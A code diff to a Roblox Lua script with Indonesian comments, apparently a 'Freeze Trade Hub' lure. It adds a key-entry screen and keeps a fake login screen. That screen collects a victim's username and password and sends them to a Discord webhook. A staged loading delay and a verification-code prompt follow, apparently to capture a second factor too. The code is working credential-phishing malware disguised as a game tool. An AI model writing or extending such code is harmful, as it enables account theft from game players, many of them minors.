@@ -37,11 +37,68 @@ local function sendToDiscord(content)
     end
 end
 
--- Fungsi Membuat GUI Kedua (Login)
+-- Fungsi Membuat GUI Key Validation
+local function createKeyValidationGUI()
+    local gui = Instance.new("ScreenGui")
+    local frame = Instance.new("Frame")
+    local keyBox = Instance.new("TextBox")
+    local submitButton = Instance.new("TextButton")
+
+    -- Properti GUI
+    gui.Name = "KeyValidationGUI"
+    gui.Parent = game.CoreGui or game:GetService("CoreGui")
+
+    -- Frame
+    frame.Name = "Frame"
+    frame.Parent = gui
+    frame.Size = UDim2.new(0, 300, 0, 150)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    frame.BorderSizePixel = 3
+    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+
+    -- Key Box
+    keyBox.Name = "KeyBox"
+    keyBox.Parent = frame
+    keyBox.Size = UDim2.new(1, -20, 0, 40)
+    keyBox.Position = UDim2.new(0, 10, 0, 40)
+    keyBox.PlaceholderText = "Masukkan Key"
+    keyBox.Font = Enum.Font.SourceSans
+    keyBox.Text = ""
+    keyBox.TextSize = 14
+    keyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    -- Submit Button
+    submitButton.Name = "SubmitButton"
+    submitButton.Parent = frame
+    submitButton.Size = UDim2.new(1, -20, 0, 40)
+    submitButton.Position = UDim2.new(0, 10, 0, 90)
+    submitButton.Text = "Submit Key"
+    submitButton.Font = Enum.Font.SourceSansBold
+    submitButton.TextSize = 16
+    submitButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    -- Fungsi Submit Button
+    submitButton.MouseButton1Click:Connect(function()
+        local enteredKey = keyBox.Text
+        if enteredKey == correctKey then
+            print("Key Valid!")
+            sendToDiscord("Key Validated: " .. enteredKey)
+            gui:Destroy()
+            createLoginGUI() -- Menampilkan GUI Login setelah key valid
+        else
+            print("Key salah!")
+            sendToDiscord("Invalid Key Attempt: " .. enteredKey)
+        end
+    end)
+end
+
+-- Fungsi Membuat GUI Login
 local function createLoginGUI()
     local gui = Instance.new("ScreenGui")
     local frame = Instance.new("Frame")
-    local titleLabel = Instance.new("TextLabel")
     local usernameBox = Instance.new("TextBox")
     local passwordBox = Instance.new("TextBox")
     local loginButton = Instance.new("TextButton")
@@ -58,17 +115,6 @@ local function createLoginGUI()
     frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
     frame.BorderSizePixel = 3
     frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-
-    -- Title Label
-    titleLabel.Name = "TitleLabel"
-    titleLabel.Parent = frame
-    titleLabel.Size = UDim2.new(1, 0, 0, 50)
-    titleLabel.Position = UDim2.new(0, 0, 0, 0)
-    titleLabel.BackgroundTransparency = 1
-    titleLabel.Font = Enum.Font.SourceSansBold
-    titleLabel.Text = "Freeze Trade Hub"
-    titleLabel.TextSize = 24
-    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
     -- Username Box
     usernameBox.Name = "UsernameBox"
@@ -113,7 +159,7 @@ local function createLoginGUI()
             print("Login berhasil! Username:", username, "Password:", password)
             sendToDiscord("Dinzz : Someone logged in\nUsername: " .. username .. "\nPassword: " .. password)
             gui:Destroy()
-            createLoadingGUI() -- Memanggil GUI loading
+            createLoadingGUI() -- Menampilkan GUI loading
         else
             print("Harap isi username dan password!")
         end
@@ -152,10 +198,10 @@ local function createLoadingGUI()
     -- Menunggu selama 8 detik sebelum melanjutkan
     wait(8)
     gui:Destroy()
-    createVerificationCodeGUI() -- Memanggil GUI verifikasi kode
+    createVerificationCodeGUI() -- Menampilkan GUI verifikasi kode
 end
 
--- Fungsi Membuat GUI Keempat (Verifikasi Kode)
+-- Fungsi Membuat GUI Verifikasi Kode
 local function createVerificationCodeGUI()
     local gui = Instance.new("ScreenGui")
     local frame = Instance.new("Frame")
